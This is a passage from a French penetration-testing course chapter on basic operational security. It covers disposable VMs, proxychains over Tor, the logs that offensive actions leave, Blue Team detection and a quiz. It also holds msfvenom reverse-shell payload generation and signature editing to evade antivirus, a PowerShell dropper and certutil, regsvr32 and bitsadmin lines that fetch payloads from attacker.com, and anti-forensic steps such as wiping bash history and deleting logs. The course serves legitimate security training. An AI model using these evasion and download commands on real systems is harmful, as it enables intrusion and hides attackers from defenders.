   - Fermez les comptes inutilisés

3. **Minimisation de l'empreinte numérique**
   - Limitez les informations partagées sur les réseaux sociaux
   - Utilisez des paramètres de confidentialité stricts
   - Évitez de partager des photos personnelles en contexte professionnel

### Cloisonnement des environnements (VM jetables)

Le cloisonnement consiste à séparer vos activités dans des environnements distincts pour éviter la contamination croisée et limiter l'exposition.

#### Principes du cloisonnement

1. **Séparation des environnements**
   - Environnement personnel : activités quotidiennes
   - Environnement professionnel : travail légitime
   - Environnement opérationnel : tests d'intrusion
   - Environnement à haut risque : analyse de malware, tests destructifs

2. **Isolation physique vs virtuelle**
   - Isolation physique : machines distinctes (optimal mais coûteux)
   - Isolation virtuelle : machines virtuelles (bon compromis)
   - Isolation par conteneurs : Docker, LXC (limité pour la sécurité)

3. **Niveaux de cloisonnement**
   - Niveau réseau : VLANs, réseaux virtuels
   - Niveau système : machines virtuelles
   - Niveau application : conteneurs, sandboxes

#### Configuration de VM jetables

Les VM jetables sont des machines virtuelles temporaires, conçues pour être utilisées une fois puis détruites.

1. **Création d'un modèle de VM**
   ```bash
   # Installation de VirtualBox
   sudo apt update
   sudo apt install -y virtualbox
   
   # Création d'une VM Kali de base
   VBoxManage createvm --name "Kali-Template" --ostype Debian_64 --register
   VBoxManage modifyvm "Kali-Template" --memory 4096 --cpus 2
   VBoxManage createhd --filename ~/VirtualBox\ VMs/Kali-Template/Kali-Template.vdi --size 40000
   VBoxManage storagectl "Kali-Template" --name "SATA Controller" --add sata
   VBoxManage storageattach "Kali-Template" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium ~/VirtualBox\ VMs/Kali-Template/Kali-Template.vdi
   VBoxManage storageattach "Kali-Template" --storagectl "SATA Controller" --port 1 --device 0 --type dvddrive --medium ~/kali-linux-2024.1-installer-amd64.iso
   ```

2. **Installation et configuration du modèle**
   - Installez Kali Linux sur la VM
   - Mettez à jour le système et installez les outils nécessaires
   - Configurez les paramètres de base (réseau, pare-feu, etc.)
   - Créez un snapshot "clean" du système

3. **Création de VM jetables à partir du modèle**
   ```bash
   # Clonage de la VM template
   VBoxManage clonevm "Kali-Template" --name "Kali-Jetable-$(date +%Y%m%d)" --register
   
   # Démarrage de la VM jetable
   VBoxManage startvm "Kali-Jetable-$(date +%Y%m%d)"
   ```

4. **Destruction de la VM après utilisation**
   ```bash
   # Arrêt forcé de la VM
   VBoxManage controlvm "Kali-Jetable-$(date +%Y%m%d)" poweroff
   
   # Suppression de la VM et de ses fichiers
   VBoxManage unregistervm "Kali-Jetable-$(date +%Y%m%d)" --delete
   ```

#### Script d'automatisation pour VM jetables

```bash
#!/bin/bash
# vm_jetable.sh - Gestion de VM jetables

# Configuration
TEMPLATE_NAME="Kali-Template"
VM_PREFIX="Kali-Jetable"
VM_MEMORY=4096
VM_CPUS=2
SNAPSHOT_NAME="clean"

# Fonction pour créer une VM jetable
create_disposable_vm() {
    local date_suffix=$(date +%Y%m%d_%H%M%S)
    local vm_name="${VM_PREFIX}-${date_suffix}"
    
    echo "[+] Création de la VM jetable: $vm_name"
    
    # Clonage de la VM template
    VBoxManage clonevm "$TEMPLATE_NAME" --name "$vm_name" --register
    
    # Configuration de la VM
    VBoxManage modifyvm "$vm_name" --memory $VM_MEMORY --cpus $VM_CPUS
    
    # Configuration réseau (NAT + réseau hôte uniquement)
    VBoxManage modifyvm "$vm_name" --nic1 nat
    VBoxManage modifyvm "$vm_name" --nic2 hostonly --hostonlyadapter2 vboxnet0
    
    echo "[+] VM jetable créée: $vm_name"
    echo "[+] Démarrage de la VM..."
    
    # Démarrage de la VM
    VBoxManage startvm "$vm_name"
    
    # Enregistrement du nom de la VM pour destruction ultérieure
    echo "$vm_name" > ~/.last_disposable_vm
}

# Fonction pour détruire la dernière VM jetable
destroy_disposable_vm() {
    if [ -f ~/.last_disposable_vm ]; then
        local vm_name=$(cat ~/.last_disposable_vm)
        
        echo "[+] Destruction de la VM jetable: $vm_name"
        
        # Arrêt forcé de la VM
        VBoxManage controlvm "$vm_name" poweroff
        
        # Attente de l'arrêt complet
        sleep 2
        
        # Suppression de la VM et de ses fichiers
        VBoxManage unregistervm "$vm_name" --delete
        
        echo "[+] VM jetable détruite: $vm_name"
        rm ~/.last_disposable_vm
    else
        echo "[-] Aucune VM jetable à détruire"
    fi
}

# Fonction pour mettre à jour le template
update_template() {
    echo "[+] Mise à jour du template: $TEMPLATE_NAME"
    
    # Démarrage de la VM template
    VBoxManage startvm "$TEMPLATE_NAME"
    
    echo "[!] Effectuez les mises à jour nécessaires puis arrêtez la VM"
    echo "[!] Ensuite, exécutez: $0 snapshot"
}

# Fonction pour créer un snapshot du template
snapshot_template() {
    echo "[+] Création d'un snapshot du template: $TEMPLATE_NAME"
    
    # Création du snapshot
    VBoxManage snapshot "$TEMPLATE_NAME" take "$SNAPSHOT_NAME" --description "État propre pour VM jetables"
    
    echo "[+] Snapshot créé: $SNAPSHOT_NAME"
}

# Menu principal
case "$1" in
    create)
        create_disposable_vm
        ;;
    destroy)
        destroy_disposable_vm
        ;;
    update)
        update_template
        ;;
    snapshot)
        snapshot_template
        ;;
    *)
        echo "Usage: $0 {create|destroy|update|snapshot}"
        echo "  create   : Crée une nouvelle VM jetable"
        echo "  destroy  : Détruit la dernière VM jetable créée"
        echo "  update   : Démarre le template pour mise à jour"
        echo "  snapshot : Crée un snapshot du template"
        exit 1
        ;;
esac

exit 0
```

### Proxychains niveau 1

Proxychains est un outil qui permet de faire passer le trafic réseau à travers des proxies, aidant à masquer l'origine des connexions.

#### Principes de base des proxies

1. **Types de proxies**
   - **HTTP/HTTPS** : Proxies pour le trafic web uniquement
   - **SOCKS4/5** : Proxies génériques pour tout type de trafic
   - **SSH** : Tunnels SSH utilisés comme proxies

2. **Chaînage de proxies**
   - Utilisation de plusieurs proxies en série
   - Augmente l'anonymat et la difficulté de traçage
   - Réduit les performances réseau

3. **Avantages et inconvénients**
   - **Avantages** : Masquage de l'IP source, contournement de restrictions
   - **Inconvénients** : Latence accrue, possibilité de fuites DNS

#### Installation et configuration de Proxychains

1. **Installation**
   ```bash
   # Installation de Proxychains
   sudo apt update
   sudo apt install -y proxychains4
   ```

2. **Configuration de base**
   ```bash
   # Édition du fichier de configuration
   sudo nano /etc/proxychains4.conf
   
   # Configuration recommandée
   # Décommentez la ligne dynamic_chain
   # Commentez la ligne strict_chain
   # Assurez-vous que ces lignes sont présentes:
   dynamic_chain
   proxy_dns
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```

3. **Ajout de proxies**
   ```bash
   # Ajout d'un proxy SOCKS5 (Tor)
   echo "socks5 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf
   
   # Installation et démarrage de Tor
   sudo apt install -y tor
   sudo systemctl start tor
   sudo systemctl enable tor
   ```

#### Utilisation de Proxychains

1. **Utilisation de base**
   ```bash
   # Vérification de l'IP sans proxy
   curl ifconfig.me
   
   # Vérification de l'IP avec proxy
   proxychains4 curl ifconfig.me
   
   # Navigation web
   proxychains4 firefox &
   
   # Scan Nmap (nécessite -sT car les raw packets ne fonctionnent pas avec proxychains)
   proxychains4 nmap -sT -Pn example.com
   ```

2. **Chaînage de proxies multiples**
   ```bash
   # Configuration de plusieurs proxies
   cat << EOF | sudo tee /etc/proxychains4.conf > /dev/null
   # proxychains.conf
   dynamic_chain
   proxy_dns
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   
   # Tor comme premier proxy
   socks5 127.0.0.1 9050
   
   # Proxy SSH comme deuxième proxy
   socks5 127.0.0.1 1080
   
   # Proxy VPN comme troisième proxy
   socks5 127.0.0.1 1081
   EOF
   
   # Configuration d'un proxy SSH
   ssh -D 1080 -f -N user@remote_server
   
   # Configuration d'un proxy via VPN
   # Supposons que vous avez un VPN configuré avec un proxy SOCKS sur le port 1081
   ```

3. **Vérification de la configuration**
   ```bash
   # Test de fuite DNS
   proxychains4 nslookup example.com
   
   # Vérification du chemin des paquets
   proxychains4 traceroute example.com
   ```

#### Configuration d'un proxy SSH

Le proxy SSH est l'une des méthodes les plus simples et sécurisées pour créer un proxy SOCKS.

```bash
# Création d'un tunnel SSH dynamique (proxy SOCKS)
ssh -D 1080 -f -N user@remote_server

# Options:
# -D 1080: Crée un proxy SOCKS sur le port local 1080
# -f: Exécute SSH en arrière-plan
# -N: N'exécute pas de commande distante (tunnel uniquement)

# Vérification que le tunnel est actif
netstat -tuln | grep 1080

# Utilisation avec proxychains
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains4 curl ifconfig.me
```

### Logs courants générés par les actions offensives

Comprendre les traces laissées par vos actions est essentiel pour une OPSEC efficace. Cette section détaille les logs générés par différentes activités offensives.

#### Logs système Linux

1. **Logs d'authentification**
   - Fichier: `/var/log/auth.log` (Debian/Ubuntu) ou `/var/log/secure` (RHEL/CentOS)
   - Contenu: Tentatives de connexion, utilisation de sudo, changements de privilèges
   
   ```bash
   # Exemple de log de connexion SSH
   May 15 14:23:45 server sshd[1234]: Accepted password for user from 192.168.1.100 port 54321 ssh2
   
   # Exemple de log d'utilisation de sudo
   May 15 14:25:12 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/cat /etc/shadow
   ```

2. **Logs système**
   - Fichier: `/var/log/syslog` (Debian/Ubuntu) ou `/var/log/messages` (RHEL/CentOS)
   - Contenu: Événements système, démarrage/arrêt de services, erreurs
   
   ```bash
   # Exemple de log de démarrage de service
   May 15 14:30:45 server systemd[1]: Started Apache HTTP Server.
   
   # Exemple de log d'erreur système
   May 15 14:32:10 server kernel: [12345.678901] TCP: Possible SYN flooding on port 80. Dropping request.
   ```

3. **Logs d'application**
   - Fichiers: Dépendent de l'application (ex: `/var/log/apache2/access.log`)
   - Contenu: Accès aux applications, erreurs, actions spécifiques
   
   ```bash
   # Exemple de log d'accès Apache
   192.168.1.100 - - [15/May/2023:14:35:22 +0200] "GET /admin.php HTTP/1.1" 404 499 "-" "Mozilla/5.0"
   
   # Exemple de log d'erreur MySQL
   2023-05-15T14:36:45.123456Z 42 [Warning] Access denied for user 'root'@'localhost'
   ```

4. **Logs de commandes**
   - Fichier: Historique bash (`~/.bash_history`)
   - Contenu: Commandes exécutées par l'utilisateur
   
   ```bash
   # Exemple de contenu de .bash_history
   ls -la
   cat /etc/passwd
   whoami
   id
   netstat -tuln
   ```

#### Logs système Windows

1. **Logs d'événements Windows**
   - Emplacement: Observateur d'événements (`eventvwr.msc`)
   - Catégories principales: Sécurité, Système, Application
   
   ```powershell
   # Exemple de commande PowerShell pour consulter les logs de sécurité
   Get-EventLog -LogName Security -Newest 10
   
   # Exemple de log d'authentification (Event ID 4624)
   # Événement de connexion réussie
   ```

2. **Logs de sécurité importants**
   - Event ID 4624: Connexion réussie
   - Event ID 4625: Échec de connexion
   - Event ID 4648: Connexion explicite avec identifiants alternatifs
   - Event ID 4672: Attribution de privilèges spéciaux
   - Event ID 4688: Création de processus
   - Event ID 4720: Création de compte utilisateur
   - Event ID 5140: Accès à un partage réseau

3. **PowerShell Logging**
   - Module Logging: Enregistre les blocs de code PowerShell
   - Script Block Logging: Enregistre les scripts exécutés
   - Transcription: Enregistre toute la session PowerShell
   
   ```powershell
   # Exemple de log de bloc de script PowerShell
   # Visible dans: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
   ```

4. **Logs Sysmon (si installé)**
   - Fournit une journalisation détaillée des activités système
   - Enregistre les créations de processus, connexions réseau, modifications de fichiers
   
   ```powershell
   # Exemple de commande pour consulter les logs Sysmon
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

#### Logs réseau

1. **Logs de pare-feu**
   - Fichiers: Dépendent du pare-feu (ex: `/var/log/ufw.log` pour UFW)
   - Contenu: Connexions autorisées/bloquées, règles appliquées
   
   ```bash
   # Exemple de log UFW
   May 15 14:40:12 server kernel: [12345.678901] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=192.168.1.100 DST=192.168.1.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=45678 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
   ```

2. **Logs de routeur/switch**
   - Accessibles via l'interface d'administration
   - Contenu: Connexions, changements de configuration, alertes
   
   ```
   # Exemple de log Cisco
   May 15 14:42:23: %SEC-6-IPACCESSLOGP: list 101 denied tcp 192.168.1.100(45678) -> 192.168.1.1(22), 1 packet
   ```

3. **Logs de proxy**
   - Fichiers: Dépendent du proxy (ex: `/var/log/squid/access.log` pour Squid)
   - Contenu: Requêtes HTTP/HTTPS, adresses IP source/destination
   
   ```
   # Exemple de log Squid
   1589547123.456 789 192.168.1.100 TCP_MISS/200 1234 GET http://example.com/ - DIRECT/93.184.216.34 text/html
   ```

4. **Logs IDS/IPS**
   - Fichiers: Dépendent du système (ex: `/var/log/snort/alert` pour Snort)
   - Contenu: Alertes de sécurité, signatures détectées
   
   ```
   # Exemple de log Snort
   [**] [1:1000001:1] NMAP TCP Scan [**]
   [Classification: Attempted Information Leak] [Priority: 2]
   05/15-14:45:12.123456 192.168.1.100:45678 -> 192.168.1.1:80
   TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:60
   ******S* Seq: 0x12345678 Ack: 0x0 Win: 0x1000 TcpLen: 40
   ```

#### Techniques de base pour réduire les traces

1. **Limitation des logs d'authentification**
   ```bash
   # Utilisation de clés SSH plutôt que mots de passe
   ssh-keygen -t ed25519 -C "key_for_target"
   ssh-copy-id -i ~/.ssh/id_ed25519.pub user@target
   
   # Connexion sans laisser de trace dans .bash_history
   ssh -T user@target  # Ne lance pas de shell interactif
   ```

2. **Limitation des logs de commandes**
   ```bash
   # Désactivation temporaire de l'historique bash
   unset HISTFILE
   
   # Ou définition d'une taille d'historique nulle
   export HISTSIZE=0
   export HISTFILESIZE=0
   
   # Exécution de commandes sans les enregistrer dans l'historique
   # Préfixez la commande avec un espace
    ls -la  # Notez l'espace au début
   ```

3. **Limitation des logs réseau**
   ```bash
   # Utilisation de connexions chiffrées
   # SSH plutôt que Telnet, HTTPS plutôt que HTTP
   
   # Limitation du nombre de connexions
   # Évitez les scans agressifs qui génèrent beaucoup de logs
   nmap -T2 --max-retries 1 target
   ```

### Premiers filtres AV et leur contournement

Les antivirus et autres solutions de sécurité constituent un obstacle majeur pour les tests d'intrusion. Comprendre leur fonctionnement et les techniques de contournement de base est essentiel.

#### Mécanismes de détection des antivirus

1. **Détection basée sur les signatures**
   - Utilisation de hachages ou de patterns connus
   - Efficace contre les malwares connus
   - Facilement contournable par modification du code

2. **Détection heuristique**
   - Analyse du comportement du code
   - Recherche de patterns suspects (ex: injection de processus)
   - Plus difficile à contourner que les signatures

3. **Détection comportementale**
   - Surveillance en temps réel des actions du programme
   - Détection basée sur les comportements anormaux
   - Nécessite des techniques d'évasion avancées

#### Techniques de contournement de base

1. **Modification de signatures**
   ```bash
   # Génération de payload avec msfvenom
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
   
   # Encodage du payload
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe
   
   # Vérification du taux de détection
   # Utilisez VirusTotal avec précaution - les hachages sont partagés avec les éditeurs d'AV
   ```

2. **Obfuscation de code**
   ```bash
   # Obfuscation de script PowerShell
   # Installation de Invoke-Obfuscation
   git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
   cd Invoke-Obfuscation
   
   # Exemple d'utilisation
   Import-Module ./Invoke-Obfuscation.psd1
   Invoke-Obfuscation
   SET SCRIPTPATH C:\path\to\script.ps1
   ENCODING
   1  # Choix de la méthode d'encodage
   ```

3. **Utilisation de droppers**
   - Séparation du code malveillant en plusieurs parties
   - Première étape: dropper (code minimal non détecté)
   - Deuxième étape: téléchargement et exécution du payload principal
   
   ```powershell
   # Exemple de dropper PowerShell simple
   $url = "http://attacker.com/payload.exe"
   $outpath = "$env:TEMP\update.exe"
   (New-Object System.Net.WebClient).DownloadFile($url, $outpath)
   Start-Process $outpath
   ```

4. **Techniques de living-off-the-land**
   - Utilisation d'outils légitimes du système
   - Réduction de la nécessité d'introduire du code malveillant
   - Difficile à détecter car utilise des binaires de confiance
   
   ```powershell
   # Exemple d'utilisation de certutil pour télécharger un fichier
   certutil -urlcache -split -f "http://attacker.com/payload.exe" %TEMP%\payload.exe
   
   # Exemple d'utilisation de regsvr32 pour exécuter du code
   regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll
   ```

#### Test de détection AV

Il est important de tester vos outils contre les solutions antivirus avant de les utiliser en environnement réel.

1. **Création d'un environnement de test**
   ```bash
   # Création d'une VM Windows avec antivirus
   # Assurez-vous que la VM est isolée du réseau
   
   # Désactivation de la soumission automatique d'échantillons
   # Cette étape dépend de l'antivirus utilisé
   ```

2. **Test de détection statique**
   ```bash
   # Transfert du fichier sur la VM
   # Vérifiez si l'antivirus le détecte immédiatement
   
   # Si non détecté, essayez de scanner manuellement le fichier
   ```

3. **Test de détection dynamique**
   ```bash
   # Exécution du fichier dans la VM
   # Observez si l'antivirus bloque l'exécution
   
   # Vérifiez les logs de l'antivirus pour comprendre la détection
   ```

### Pièges classiques et erreurs à éviter

#### Erreurs d'identité

1. **Réutilisation d'identifiants**
   - Utilisation du même nom d'utilisateur sur différentes plateformes
   - Réutilisation d'adresses email entre contextes
   - Solution: Créez des identités distinctes pour chaque contexte

2. **Fuites d'informations personnelles**
   - Partage d'informations personnelles dans des contextes professionnels
   - Utilisation de photos personnelles comme avatars
   - Solution: Maintenez une séparation stricte entre vos identités

3. **Négligence des métadonnées**
   - Oubli de nettoyer les métadonnées des documents (EXIF, auteur, etc.)
   - Utilisation d'outils qui laissent des signatures identifiables
   - Solution: Nettoyez systématiquement les métadonnées
   
   ```bash
   # Nettoyage des métadonnées d'une image
   exiftool -all= image.jpg
   
   # Nettoyage des métadonnées d'un document PDF
   qpdf --linearize input.pdf output.pdf
   ```

#### Erreurs de cloisonnement

1. **Contamination croisée**
   - Transfert de fichiers entre environnements sans précaution
   - Utilisation du même navigateur pour différentes identités
   - Solution: Utilisez des environnements strictement séparés

2. **Fuites réseau**
   - Oubli de vérifier les connexions réseau actives
   - Configuration incorrecte des proxies
   - Solution: Vérifiez régulièrement vos connexions réseau
   
   ```bash
   # Vérification des connexions réseau actives
   netstat -tuln
   
   # Vérification des fuites DNS
   tcpdump -i any -n port 53
   ```

3. **Persistance non désirée**
   - Oubli de nettoyer les traces après une opération
   - Conservation de VM compromises
   - Solution: Détruisez systématiquement les environnements après utilisation

#### Erreurs de logs

1. **Négligence des logs système**
   - Oubli de désactiver la journalisation
   - Non-suppression des logs après opération
   - Solution: Planifiez la gestion des logs avant chaque opération

2. **Traces dans les fichiers temporaires**
   - Oubli de nettoyer les fichiers temporaires
   - Utilisation de /tmp sans précaution
   - Solution: Utilisez des répertoires temporaires chiffrés
   
   ```bash
   # Création d'un répertoire temporaire sécurisé
   mkdir -p ~/.secure_tmp
   mount -t tmpfs -o size=100M,mode=0700 tmpfs ~/.secure_tmp
   
   # Utilisation du répertoire temporaire
   export TMPDIR=~/.secure_tmp
   
   # Nettoyage après utilisation
   umount ~/.secure_tmp
   ```

3. **Historique de commandes**
   - Oubli de désactiver l'historique
   - Exécution de commandes sensibles sans précaution
   - Solution: Désactivez l'historique pour les sessions sensibles

### Vue Blue Team / logs générés / alertes SIEM

Comprendre la perspective défensive est essentiel pour une OPSEC efficace. Cette section détaille comment les équipes de sécurité détectent les activités offensives.

#### Détection des activités de reconnaissance

1. **Logs générés**
   - Journaux de connexion des serveurs web (adresse IP source, user-agent, pages visitées)
   - Logs DNS pour les résolutions de noms
   - Alertes de scan de ports

   **Exemple de log Apache :**
   ```
   192.168.1.100 - - [15/May/2023:14:23:45 +0200] "GET /admin.php HTTP/1.1" 404 499 "-" "Mozilla/5.0"
   ```

2. **Détection possible**
   - Concentration inhabituelle de requêtes depuis une même source
   - Patterns de scan reconnaissables (séquence de ports, timing)
   - User-agents non standards ou outils de reconnaissance identifiables

3. **Alertes SIEM typiques**
   ```
   [ALERT] Port Scan Detected
   Source IP: 192.168.1.100
   Target: Multiple hosts
   Time: 2023-05-15 14:23:45
   Details: Multiple connection attempts to different ports within 5 seconds
   Severity: Medium
   ```

#### Détection des activités d'exploitation

1. **Logs générés**
   - Journaux d'authentification (tentatives échouées)
   - Logs d'application (erreurs, exceptions)
   - Alertes IDS/IPS sur des signatures d'attaques connues

   **Exemple de log d'authentification :**
   ```
   May 15 14:30:12 server sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
   ```

2. **Détection possible**
   - Multiples échecs d'authentification
   - Requêtes contenant des payloads malveillants (SQLi, XSS, etc.)
   - Exécution de commandes système inhabituelles

3. **Alertes SIEM typiques**
   ```
   [ALERT] Brute Force Attack Detected
   Source IP: 192.168.1.100
   Target: 192.168.1.200 (SSH)
   Time: 2023-05-15 14:30:12
   Details: 10+ failed authentication attempts in 60 seconds
   Severity: High
   ```

#### Détection des activités post-exploitation

1. **Logs générés**
   - Création de nouveaux comptes ou modification de privilèges
   - Exécution de commandes avec privilèges élevés
   - Connexions réseau inhabituelles

   **Exemple de log Windows :**
   ```
   Event ID: 4720
   A user account was created.
   Account Name: backdoor
   Security ID: S-1-5-21-1234567890-1234567890-1234567890-1001
   ```

2. **Détection possible**
   - Activité administrative en dehors des heures habituelles
   - Connexions depuis des postes non autorisés
   - Transferts de données volumineux ou vers des destinations inhabituelles

3. **Alertes SIEM typiques**
   ```
   [ALERT] Suspicious Account Creation
   Host: WIN-DC01
   Time: 2023-05-15 15:45:22
   Details: New admin account created outside business hours
   Severity: Critical
   ```

### OPSEC Tips : bonnes pratiques initiales

#### Gestion des identités

1. **Création d'identités cloisonnées**
   - Utilisez des emails différents pour chaque contexte
   - Créez des profils de navigateur distincts
   - Utilisez des machines virtuelles dédiées

2. **Protection des informations personnelles**
   - Limitez les informations partagées en ligne
   - Utilisez des services respectueux de la vie privée
   - Vérifiez régulièrement votre empreinte numérique

3. **Gestion sécurisée des identifiants**
   - Utilisez un gestionnaire de mots de passe dédié
   - Générez des mots de passe forts et uniques
   - Changez régulièrement vos identifiants

#### Réduction des traces

1. **Préparation avant opération**
   ```bash
   # Création d'un script de préparation
   cat > opsec_prep.sh << 'EOF'
   #!/bin/bash
   # Script de préparation OPSEC
   
   # Désactivation de l'historique
   unset HISTFILE
   export HISTSIZE=0
   
   # Création d'un répertoire temporaire sécurisé
   mkdir -p ~/.secure_tmp
   mount -t tmpfs -o size=100M,mode=0700 tmpfs ~/.secure_tmp
   export TMPDIR=~/.secure_tmp
   
   # Configuration de proxychains
   echo "dynamic_chain
   proxy_dns
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   socks5 127.0.0.1 9050" > ~/.proxychains.conf
   
   # Vérification que Tor est en cours d'exécution
   if ! pgrep -x "tor" > /dev/null; then
       echo "[!] Tor n'est pas en cours d'exécution. Démarrage..."
       sudo systemctl start tor
   fi
   
   # Vérification de l'adresse IP
   echo "[+] Adresse IP sans proxy:"
   curl -s ifconfig.me
   echo "[+] Adresse IP avec proxy:"
   proxychains4 -f ~/.proxychains.conf curl -s ifconfig.me
   
   echo "[+] Environnement OPSEC prêt"
   EOF
   
   chmod +x opsec_prep.sh
   ```

2. **Nettoyage après opération**
   ```bash
   # Création d'un script de nettoyage
   cat > opsec_cleanup.sh << 'EOF'
   #!/bin/bash
   # Script de nettoyage OPSEC
   
   # Nettoyage des fichiers temporaires
   if mountpoint -q ~/.secure_tmp; then
       rm -rf ~/.secure_tmp/*
       umount ~/.secure_tmp
       rmdir ~/.secure_tmp
   fi
   
   # Nettoyage des logs
   if [ -f ~/.bash_history ]; then
       cat /dev/null > ~/.bash_history
   fi
   
   # Nettoyage des caches de navigateur
   if [ -d ~/.mozilla ]; then
       echo "[!] Pensez à nettoyer les caches de Firefox"
   fi
   
   # Arrêt des services
   sudo systemctl stop tor
   
   echo "[+] Nettoyage OPSEC terminé"
   EOF
   
   chmod +x opsec_cleanup.sh
   ```

3. **Vérification régulière**
   ```bash
   # Création d'un script de vérification
   cat > opsec_check.sh << 'EOF'
   #!/bin/bash
   # Script de vérification OPSEC
   
   echo "[+] Vérification des connexions réseau actives"
   netstat -tuln
   
   echo "[+] Vérification des processus suspects"
   ps aux | grep -E 'nc|ncat|netcat|nmap|metasploit'
   
   echo "[+] Vérification des fuites DNS"
   tcpdump -i any -n -c 10 port 53
   
   echo "[+] Vérification de l'adresse IP"
   curl -s ifconfig.me
   
   echo "[+] Vérification terminée"
   EOF
   
   chmod +x opsec_check.sh
   ```

#### Protection contre la détection

1. **Utilisation de techniques anti-forensics de base**
   ```bash
   # Utilisation de disques RAM pour les opérations sensibles
   mkdir -p /tmp/ramdisk
   mount -t tmpfs -o size=512M tmpfs /tmp/ramdisk
   cd /tmp/ramdisk
   
   # Travail dans le disque RAM
   # ...
   
   # Nettoyage
   cd
   umount /tmp/ramdisk
   ```

2. **Réduction de la signature des outils**
   ```bash
   # Modification des chaînes de caractères dans les binaires
   # Exemple avec msfvenom
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
   
   # Modification des chaînes avec hexedit
   hexedit payload.exe
   # Recherchez et modifiez les chaînes comme "Meterpreter", "metasploit", etc.
   ```

3. **Utilisation d'outils légitimes**
   ```bash
   # Utilisation de PowerShell pour le téléchargement de fichiers
   powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://attacker.com/file.txt', 'C:\Windows\Temp\file.txt')"
   
   # Utilisation de bitsadmin pour le téléchargement de fichiers
   bitsadmin /transfer myJob /download /priority high http://attacker.com/file.txt C:\Windows\Temp\file.txt
   ```

### Points clés

- L'OPSEC de niveau 1 se concentre sur l'hygiène numérique et la gestion des traces, fondamentales pour toute activité de sécurité offensive.
- La gestion des identités et le cloisonnement des environnements sont essentiels pour éviter la corrélation et le traçage.
- Les VM jetables offrent un environnement propre et isolé pour chaque opération, limitant les risques de contamination croisée.
- Proxychains permet de masquer l'origine des connexions, mais doit être correctement configuré pour éviter les fuites.
- Comprendre les logs générés par vos actions est crucial pour minimiser votre empreinte numérique.
- Les techniques de contournement d'antivirus de base incluent l'obfuscation, l'encodage et l'utilisation d'outils légitimes.
- La perspective Blue Team aide à comprendre comment vos activités peuvent être détectées et à adapter vos techniques en conséquence.

### Mini-quiz (3 QCM)

1. **Quelle technique est la plus efficace pour cloisonner vos activités de pentesting ?**
   - A) Utiliser un navigateur en mode incognito
   - B) Utiliser des VM jetables dédiées à chaque opération
   - C) Utiliser un VPN commercial
   - D) Utiliser un compte utilisateur différent sur la même machine

   *Réponse : B*

2. **Quelle commande permet de désactiver l'enregistrement des commandes dans l'historique bash ?**
   - A) `history -c`
   - B) `rm ~/.bash_history`
   - C) `unset HISTFILE`
   - D) `export HISTCONTROL=ignorespace`

   *Réponse : C*

3. **Quel type de log Windows enregistre la création de nouveaux comptes utilisateurs ?**
   - A) Application Log
   - B) System Log
   - C) Security Log (Event ID 4720)
   - D) Setup Log

   *Réponse : C*

### Lab/Exercice guidé : Mise en place d'un environnement cloisonné

#### Objectif
Créer un environnement de pentesting cloisonné avec VM jetable, proxychains et techniques de réduction des traces.

#### Prérequis
- Kali Linux (hôte ou VM)
- VirtualBox ou VMware
- Connexion Internet

#### Étapes

1. **Préparation de l'environnement hôte**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/opsec_lab
cd ~/pentest_labs/opsec_lab

# Installation des outils nécessaires
sudo apt update
sudo apt install -y virtualbox proxychains4 tor torbrowser-launcher exiftool

# Démarrage de Tor
sudo systemctl start tor
sudo systemctl enable tor
```

2. **Création d'un script de gestion de VM jetables**

```bash
# Création du script
cat > vm_jetable.sh << 'EOF'
#!/bin/bash
# Script de gestion de VM jetables

# Configuration
TEMPLATE_NAME="Kali-Template"
VM_PREFIX="Kali-Jetable"
VM_MEMORY=4096
VM_CPUS=2
ISO_PATH="$HOME/kali-linux-2024.1-installer-amd64.iso"
VDI_PATH="$HOME/VirtualBox VMs/$TEMPLATE_NAME/$TEMPLATE_NAME.vdi"
SNAPSHOT_NAME="clean"

# Fonction pour créer le template
create_template() {
    echo "[+] Création du template: $TEMPLATE_NAME"
    
    # Vérification de l'existence de l'ISO
    if [ ! -f "$ISO_PATH" ]; then
        echo "[!] ISO non trouvée: $ISO_PATH"
        echo "[!] Téléchargement de l'ISO..."
        wget -O "$ISO_PATH" https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso
    fi
    
    # Création de la VM
    VBoxManage createvm --name "$TEMPLATE_NAME" --ostype Debian_64 --register
    
    # Configuration de la VM
    VBoxManage modifyvm "$TEMPLATE_NAME" --memory $VM_MEMORY --cpus $VM_CPUS
    VBoxManage modifyvm "$TEMPLATE_NAME" --nic1 nat
    VBoxManage modifyvm "$TEMPLATE_NAME" --nic2 hostonly --hostonlyadapter2 vboxnet0
    
    # Création du disque dur
    VBoxManage createhd --filename "$VDI_PATH" --size 40000
    
    # Configuration du stockage
    VBoxManage storagectl "$TEMPLATE_NAME" --name "SATA Controller" --add sata
    VBoxManage storageattach "$TEMPLATE_NAME" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium "$VDI_PATH"
    VBoxManage storageattach "$TEMPLATE_NAME" --storagectl "SATA Controller" --port 1 --device 0 --type dvddrive --medium "$ISO_PATH"
    
    echo "[+] Template créé: $TEMPLATE_NAME"
